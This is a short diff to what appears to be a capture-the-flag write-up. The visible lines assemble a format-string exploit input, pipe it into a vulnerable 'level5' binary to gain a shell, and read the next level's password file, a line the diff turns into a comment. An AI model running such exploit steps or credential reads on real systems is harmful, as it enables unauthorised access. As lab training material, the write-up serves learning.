@@ -70,4 +70,4 @@ INPUT="${PRINTF_PAYLOAD}${PRINTF_ADDRESSES_ALIGNMENT}${PRINTF_ADDRESSES}"
 (echo "${INPUT}" && cat) | ./level5
 
 # We use the reverse shell to retrieve the password
-$ cat /home/user/level6/.pass
+# $> cat /home/user/level6/.pass
